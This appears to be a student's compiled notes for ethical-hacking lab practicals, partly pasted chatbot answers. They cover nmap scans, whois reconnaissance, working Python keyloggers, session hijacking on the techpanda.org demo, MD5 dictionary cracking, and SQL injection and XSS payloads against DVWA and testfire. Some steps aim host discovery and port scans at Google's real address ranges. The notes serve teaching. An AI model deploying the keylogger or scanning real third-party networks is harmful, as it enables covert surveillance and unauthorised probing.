use ping and ip scanner to scan the network list your findings
*1. Use Ping and IP Scanner to Scan the Network*

#### A. *Ping the Network:*
In terminal:

bash
ping -c 4 192.168.1.1


Replace 192.168.1.1 with your *default gateway IP*.

#### B. *Scan IP Range with nmap:*

1. Install it (if needed):

bash
sudo apt install nmap


2. Scan the network:

bash
nmap -sn 192.168.1.0/24


2. Keylogger Attack using Python (for local testing only)*
Steps:

1. Create the script:

bash
nano keylogger.py


2. Paste this code:

python
from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")

with Listener(on_press=on_press) as listener:
    listener.join()


3. Install the required library:

bash
pip install pynput


4. Run the keylogger:

bash
python3 keylogger.py
It will record all keypresses into log.txt in the same directory.


*1. Find Number of Hops to www.google.com*
Use the traceroute (Linux/macOS) or tracert (Windows) command.

#### *On Linux/macOS:*
bash
traceroute www.google.com
#### *On Windows:*

cmd
tracert www.google.com
The *number of hops* is the number of lines (usually minus the first one if it’s your own router). For example:
1   <local router>
2   ...
3   ...
...
10  <final hop: google>
So, *10 hops*.

### *2. Simple Keylogger in Python*

If you're using *Windows/Linux*, here's a basic version that logs keystrokes:

#### *Python Code:*

python
from pynput.keyboard import Listener

def log_key(key):
    with open("keylog.txt", "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")

with Listener(on_press=log_key) as listener:
    listener.join()


#### *Steps:*

1. Save it as keylogger.py
2. Install the required module:

bash
pip install pynput


3. Run it:

bash
python keylogger.py


It will log every key pressed into keylog.txt.


Part A: Perform Reconnaissance to Obtain the Following
This is about information gathering — often the first step in ethical hacking or penetration testing.

Let’s break it down:

a) The domain name
If given a company or URL, extract the domain.

Example: From https://www.google.com, the domain is google.com.

b) The URL
This is the full web address of a resource.

Example: https://example.com/contact.html

c) Registrant name – Who registered the domain
Use https://who.is or:

bash
Copy
Edit
whois example.com
Look for Registrant Name or Organization.

d) Email address
Often available in WHOIS data unless privacy protection is enabled.

Tools: whois, https://whois.domaintools.com

e) IP address
Use the ping or nslookup or dig command:

bash
Copy
Edit
nslookup example.com
or

bash
Copy
Edit
dig example.com +short


wire shark
Step 1: Set Up a Simple HTTP Login Page
Create an HTML file (login.html) and save it on your local machine.
Code:
<!DOCTYPE html>
<html>
<head>
  <title>Test HTTP Login</title>
</head>
<body>
  <h2>Login</h2>
  <form method="POST" action="http://example.com/login">
    <input type="text" name="username" placeholder="Username" /><br><br>
    <input type="password" name="password" placeholder="Password" /><br><br>
    <input type="submit" value="Login" />
  </form>
</body>
</html>

This form sends credentials as plain text over HTTP, making them visible in Wireshark.
Step 2: Start Capturing Packets in Wireshark
1. Open Wireshark on your PC.
2. Select Your Network Interface (Wi-Fi or Ethernet).
• Click Capture → Options → Select your active network interface.
3. Click "Start" to begin packet capture.


waterfirefox
 Install and configure the Tamper Data add-on in Firefox.
 Intercept and modify HTTP requests to impersonate a user's session.
Step 1: Download and Install Waterfox
● Official link: https://www.waterfox.net/download/
● Choose the version for your operating system (Windows, Mac, Linux).
● Install the browser after downloading.

Step 2: Install Tamper Data Add-on
● Mozilla Add-ons link:
https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/
● Click "Add to Firefox" and install.

Step 3: Install Cookie Editor
● Mozilla Add-ons link: https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
● Install it in Waterfox.

Step 4: Login to the Target Website
1. Open Waterfox.
2. Navigate to https://www.techpanda.org/
Use the given credentials:
Email: admin@google.com
Password: Password2010

3. Login to the website with the provided credentials .
4. Open the Cookie Editor.
5. Copy the PHPSESSIONID while you're still logged in.
6. After copying the session ID, then log out and delete the cookies as per the next
steps.

Step 5: Delete Cookies
1. Go to Browser Settings → Navigate to Privacy & Security options.
2. Find the option to remove individual cookies (In Waterfox/Firefox: Settings >
Privacy & Security > Cookies and Site Data > Manage Data).
3. Search for the website (e.g., techpanda.org).
4. Delete the session cookies related to the site.
Step 6: Start Tamper Data
1. Open Waterfox.
2. Click Extensions → Open Tamper Data.
3. Click Start Tamper.
Step 7: Open Dashboard URL
In a new tab, go to: https://www.techpanda.org/dashboard.php
1. Click on Submit, A popup appears asking to Ok.
2. Locate the PHPSESSIONID field.
3. Paste the copied PHPSESSIONID.
4. Click OK and Submit.
Note : If not working try continue and enter PHPSESSIONID it will work.

Step 8: Successfully Impersonate the Session
● If successful, you should now access the dashboard without logging in.
The website recognizes the stolen session and logs you in automatically.

or

Step 1: Download Waterfox Browser Portable from the link: http://bit.ly/RCWATERFOX
Step 2: Install and Open Waterfox Browser
Step 3: Download tamper data add-on from the link: http://bit.ly/RCTAMPER
Step 4: Open the Add-Ons window in the browser
Step 5: Drag the downloaded Tamper Data Add-On to the browser window (restart if asked)
Step 6: Open the Add-Ons window (if not already open) and search for cookie editor
Install Cookie-Editor 1.8.0
Step 7: Now open http://www.techpanda.org/
Step 8: Assume you know the id and password for the first time
admin@google.com
Password2010
Step 9: After you see the dashboard, open the cookie editor and copy the phpsessionid
Step 10: Also copy the dashboard URL.Now close the dashboard tab
Step 11: Now open the browser options/privacy/remove individual cookies and delete the cookie(s)
Step 12: Now open Tools -> Tamper Data menu and Click on Start Tamper
Step 13: Now directly open the dashboard URL:http://www.techpanda.org/dashboard.php
Step 14: On the popup, remove the tick of 'Continue Tampering?' and click on Submit
Now again directly open the dashboard URL:
http://www.techpanda.org/dashboard.php
Step 15: On the popup, 'Continue Tampering?' click on tamper, and paste the earlier copied PHPSessionID and
press Ok.On the popup, remove the tick of 'Continue Tampering?' and click on Submit
Step 16: You should see the logged in dashboard directly without logging in.







PRACTICAL NO – 2.2
AIM : Use Cain and Abel for cracking Windows account password using Dictionary attack
and to decode wireless network passwords.
Step 1 - Open Cain Software.
Step 2 - Open Hash Calculator.
Step 3 - Type text and click on calculate and Copy MD5 text.
Step 4 - Select MD5 hashes in cracker and click on add to list and paste the MD5 text.
Step 5 - It will get pasted in the first column.
Step 6 - Then right click in text and select the dictionary attack.
Step 7 - Dictionary attack will open and then Right click on the column and select add to list then
add the wordlist .
Step 8 - Start the dictionary attack and the output will be shown as 1 of 1 hashes cracked.


Use CryptTool to encrypt and decrypt passwords using RC4 algorithm.
step1 open crytool 
Step 2 : Using RC4.
Decryption



AIM : Using Nmap scanner to perform port scanning of various forms – ACK, SYN, FIN,
NULL, XMAS.
NOTE : Install Nmap for windows and install it. After that open cmd and type “nmap” to check
if it is installed properly. Now type the below commands.
(A) TYPE THE COMMANDS IN COMMAND PROMPT :
(i) ACK -sA (TCP ACK scan)
Command : nmap -sA -T4 scanme.nmap.org

(ii) SYN (Stealth) Scan (-sS)
Command : nmap -p22,113,139 scanme.nmap.org

(iii) FIN Scan (-sF)
Command : nmap -sF -T4 192.168.0.5

(iv) NULL Scan (-sN)
Command : nmap –sN –p 22 scanme.nmap.org

(v) XMAS Scan (-sX)
Command : nmap -sX -T4 scanme.nmap.org

(B) TYPE THE COMMANDS IN Nmap :
(i) ACK -sA (TCP ACK scan)
Command : nmap -sA -T4 scanme.nmap.org

(ii) SYN (Stealth) Scan (-sS)
Command : nmap -p22,113,139 scanme.nmap.org

(iii) FIN Scan (-sF)
Command : nmap -sF -T4 192.168.0.5

(iv) NULL Scan (-sN)
Command : nmap –sN –p 22 scanme.nmap.org

(v) XMAS Scan (-sX)
Command : nmap -sX -T4 scanme.nmap.org

nmap -T4 -A -v <target-ip>
# Intense scan on 192.168.1.1
nmap -T4 -A -v 192.168.1.1

# Xmas scan on 192.168.1.1
nmap -sX 192.168.1.1




Sure! Here's **Practical 1 in detail**, broken into simple steps with tools you can use on any computer — no coding required.

---

## ✅ **Practical 1: Find the Owner of the Website Godaddy.com, Its Geographic Location, and the Owner of the IP Address Block**

### 🎯 Objective:
To perform **domain reconnaissance** by finding:
1. Domain Owner
2. Geographic Location
3. IP Block Owner

---

## 🔧 **Step-by-Step Instructions:**

---

### 🔹 Step 1: Get WHOIS Information (Owner Details)

#### 👉 Tool: [https://whois.domaintools.com/](https://whois.domaintools.com/)

#### 📌 Steps:
1. Open your web browser.
2. Go to: [https://whois.domaintools.com/godaddy.com](https://whois.domaintools.com/godaddy.com)
3. You’ll see details like:
   - **Registrar**: GoDaddy.com, LLC
   - **Registrant Organization**: GoDaddy Inc.
   - **Creation Date**: (e.g., 1999-03-02)
   - **Updated Date**
   - **Expiry Date**

> ✅ *This tells you who owns the domain and who registered it.*

---

### 🔹 Step 2: Find IP Address and Location

#### 👉 Tool: [https://ipinfo.io/](https://ipinfo.io/)

#### 📌 Steps:
1. Visit [https://ipinfo.io/](https://ipinfo.io/)
2. In the search bar, type: `godaddy.com`
3. Press Enter.

You’ll see:
- **IP Address** (e.g., `104.238.65.236`)
- **City** (e.g., Scottsdale)
- **Region** (e.g., Arizona)
- **Country** (e.g., US)
- **Organization** (e.g., GoDaddy.com, LLC)

> ✅ *This gives the geographic location and company that owns the IP address.*

---

### 🔹 Step 3: Find IP Address Block Owner

#### 👉 Tool: [https://bgp.he.net/](https://bgp.he.net/)

#### 📌 Steps:
1. Visit [https://bgp.he.net/](https://bgp.he.net/)
2. Enter the IP address you got from Step 2 (e.g., `104.238.65.236`)
3. Look for:
   - **Netblock**: e.g., `104.238.64.0/18`
   - **Org Name**: GoDaddy.com, LLC

> ✅ *This shows the larger IP block range and its owner.*

---

## 📋 Sample Result Summary (to Write in Journal/Submission):

```
Domain: godaddy.com
Owner: GoDaddy Inc.
Registrar: GoDaddy.com, LLC

IP Address: 104.238.65.236
Location: Scottsdale, Arizona, United States
Organization: GoDaddy.com, LLC

IP Block: 104.238.64.0/18
IP Block Owner: GoDaddy.com, LLC
```


2. Reconnaissance on www.google.com
You can do this using Command Prompt on Windows or Linux Terminal.

a) Determine Network Range
Use:

bash
Copy
Edit
nslookup www.google.com
You will get an IP address. Then use:

bash
Copy
Edit
whois <IP address>
It will show the IP block or range.

b) Identify Active Machines
Use a simple network scanner like:

Angry IP Scanner or

nmap (if installed)

Example with nmap:

bash
Copy
Edit
nmap -sn 142.250.0.0/16
(142.250.x.x is one of Google's IP ranges)

c) Discover Open Ports and Access Points
bash
Copy
Edit
nmap www.google.com
This shows open ports (like 80 for HTTP, 443 for HTTPS).

d) Uncover Services on Ports
bash
Copy
Edit
nmap -sV www.google.com
This command gives the service running on each port (like Apache, nginx, etc).

e) Server Name
Use:

bash
Copy
Edit
nslookup www.google.com
or

bash
Copy
Edit
dig www.google.com
You’ll get the canonical name (CNAME) or server alias.


Here's how to **perform Practical B** as shown in your image, step by step, using free and easy tools:

---

## ✅ **Practical B: Reconnaissance to Obtain Domain Info**

### 🎯 Objective:
To gather the following information using **reconnaissance techniques**:
- a) Domain Name  
- b) URL  
- c) Registrant Name (who registered the domain)  
- d) Email Address  
- e) IP Address

---

## 🛠️ Tools Used:
- [https://whois.domaintools.com/](https://whois.domaintools.com/)
- [https://ipinfo.io/](https://ipinfo.io/)
- [https://dnschecker.org/](https://dnschecker.org/) *(Optional)*
- Command prompt or terminal for `nslookup`

---

## 🔍 Step-by-Step Guide:

---

### 🔹 Step 1: Choose a Domain (e.g., `example.com` or `mumbaiuniversity.digital`)

Let’s take **example: `mumbaiuniversity.digital`**

---

### 🔹 Step 2: Find the Domain Info (Whois Lookup)

#### 👉 Go to: [https://whois.domaintools.com/mumbaiuniversity.digital](https://whois.domaintools.com/mumbaiuniversity.digital)

You will get:

- **a) Domain Name**: mumbaiuniversity.digital  
- **b) URL**: [https://mumbaiuniversity.digital](https://mumbaiuniversity.digital)  
- **c) Registrant Name**: (e.g., Name of the organization or person — might be hidden)  
- **d) Email Address**: (Can be seen here or shown as a proxy email)

---

### 🔹 Step 3: Find the IP Address

#### Method 1: Using `nslookup` in CMD/Terminal

Open Command Prompt and type:
```bash
nslookup mumbaiuniversity.digital
```
You will get:
- **e) IP Address**: e.g., `3.108.120.207`

#### Method 2: Using [https://ipinfo.io/](https://ipinfo.io/)

1. Go to: [https://ipinfo.io/](https://ipinfo.io/)
2. Enter the domain `mumbaiuniversity.digital`
3. It will display:
   - IP Address
   - City, Country
   - ISP (Organization)

---

## 📋 Sample Report (for your journal/assignment):

```
Domain Name: mumbaiuniversity.digital  
URL: https://mumbaiuniversity.digital  
Registrant Name: Mumbai University (may be hidden under proxy)  
Email Address: contact@mumbaiuniversity.digital (if publicly visible)  
IP Address: 3.108.120.207  
```

---




## ✅ **B. Perform Reconnaissance on www.google.com**

We’ll use tools like `nmap`, `whois`, and `nslookup`.

### 🔧 Install Nmap:
```bash
sudo apt install nmap       # Linux
choco install nmap          # Windows (using Chocolatey)
```

---

### 🔹 a) Determine the network range:
You need the IP first:

```bash
nslookup www.google.com
```

Example output:
```
Name:    www.google.com
Addresses:  142.250.195.196
```

To find the network range:
Use CIDR notation (e.g., `142.250.195.0/24`)

---

### 🔹 b) Identify active machines:
```bash
nmap -sn 142.250.195.0/24
```
This will show devices that are live.

---

### 🔹 c) Discover open ports and access points:
```bash
nmap -p- www.google.com
```

---

### 🔹 d) Uncover services on ports:
```bash
nmap -sV www.google.com
```
This shows what services are running on each open port.

---

### 🔹 e) Find Server Name:
```bash
nslookup www.google.com
```
or use:
```bash
dig www.google.com +short
```

---

## 📝 Sample Report Format:

```
A. Keylogger:
- Python script used to log keystrokes
- Logs saved in keylog.txt

B. Reconnaissance on www.google.com:
a) Network Range: 142.250.195.0/24  
b) Active Machines: Found using nmap -sn  
c) Open Ports: 80, 443 (example)  
d) Services: HTTP, HTTPS (detected using -sV)  
e) Server Name: google.com  
```

---

Let me know if you want a **.docx/PDF file** for submission or need help running any command!



Here's a **detailed procedure for Practical 1 (as shown in the image)**:

---

### 🔐 **Part A: Crack the password using**
#### a) Dictionary Attack  
#### b) Cryptool

---

### ✅ **a) Dictionary Attack using Python**

A dictionary attack tries passwords from a predefined list (a "dictionary").

#### 🔧 Python Script:
```python
import hashlib

def crack_password(hash_to_crack, dictionary_file):
    with open(dictionary_file, 'r') as file:
        for word in file.readlines():
            word = word.strip()
            hashed_word = hashlib.md5(word.encode()).hexdigest()
            if hashed_word == hash_to_crack:
                print(f"Password found: {word}")
                return
    print("Password not found.")

# Example usage
hash_to_crack = "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 for "password"
dictionary_file = "dictionary.txt"
crack_password(hash_to_crack, dictionary_file)
```

> **Note:** Create `dictionary.txt` with common passwords.

---

### ✅ **b) Using Cryptool**

**Cryptool** is a Windows application for learning cryptographic techniques.

#### 🔧 Steps:
1. Download and install **[Cryptool](https://www.cryptool.org/en/)**
2. Open **Cryptool 2**
3. Click on **"Analysis" > "Hash Functions" > "Determine plaintext from hash value"**
4. Enter the hash and select hash type (e.g., MD5, SHA1)
5. Load a wordlist file (dictionary) for the tool to try against
6. Click **Start** to begin the dictionary attack

---

### 🕵️‍♂️ **Part B: Perform Reconnaissance**

Use **whois**, **nslookup**, and online tools.

---

### ✅ a) **Find the Domain Name**
Example:  
For URL: `https://www.google.com`  
**Domain name:** `google.com`

---

### ✅ b) **Find the URL**
The complete address of a website, e.g.,  
**URL:** `https://www.google.com/`

---

### ✅ c) **Find Registrant Name (Who registered the domain)**

#### 🔧 Command:
```bash
whois google.com
```

#### Sample output:
```
Registrar: MarkMonitor Inc.
Registrant Name: Google LLC
```

Or use: [https://who.is](https://who.is)

---

### ✅ d) **Find Email Address**

From `whois` output or via [https://who.is](https://who.is)

---

### ✅ e) **Find IP Address**

#### 🔧 Command:
```bash
nslookup google.com
```

#### Sample Output:
```
Name:    google.com
Address: 142.250.195.206
```

---

## 📋 Sample Report Format:

```
A. Password Cracking:
Method: Dictionary Attack
Tool Used: Cryptool / Python
Result: Password "password" matched hash.

B. Reconnaissance on www.google.com:
a) Domain Name: google.com
b) URL: https://www.google.com
c) Registrant: Google LLC (via whois)
d) Email: abuse@google.com
e) IP Address: 142.250.195.206
```











AIM: Perform SQL injection attack.
 Prerequisites
✔ Installed XAMPP (Download from https://www.apachefriends.org)
✔ XAMPP Control Panel is working
Step 1: Start XAMPP
Open XAMPP Control Panel.
Click Start for:
Apache
MySQL

Step 2: Open phpMyAdmin
Create a Database
sql_db
Click Create.

Step 3: Download & Setup DVWA
Set Up the SQL Injection Environment
Download DVWA from GitHub:
Go to: https://github.com/digininja/DVWA
Click Code → Download ZIP.
● Extract the downloaded ZIP file inside C:\xampp\htdocs\.
● Rename the DVWA-master folder to sql_injection.

Now go to the sql_injection\config folder
This file should be there config.inc.php.dist copy paste and rename it to config.inc.php

Modify the Database Credentials
Inside config.inc.php, find this section:
$_DVWA[ 'db_user' ] = 'dvwa';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
🔹 Change it to use MySQL’s default root user:
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = '';
Since XAMPP MySQL doesn’t have a password for root by default, leaving it empty will
work.

Step 4:
Open a web browser.
Type in the URL:
http://localhost/sql_injection/setup.php
Click on Create/Reset Database.

Step 5: Click on login or Go to: http://localhost/sql_injection/login.php
Enter the following login details:
Username: admin
Password: password
Click Login.

Step 6: Lower Security Level
Look at the left-side menu.
Click on DVWA Security.
Set the Security Level to Low.

Step 7: Performing SQL Injection
Basic Injection
In the text box, type:
1
Bypassing Authentication
In the text box, type:
a' or ''='
Extracting Data
In the text box, type:
1=1
Wildcard Injection
In the text box, type:
1*




PRACTICAL NO - 6

AIM: Simulate persistant Cross Site Scripting attack. Step 1: Open a demo.testfire.net website in a new window and write the given below script in the search

box of the website

Code:- <script>alert("Pavisha TYCS 91")</script>

Step 2: Click on the GO button and a popup box get displayed in the web browser window and it will contain
all the information written in the search box within the Script tag.
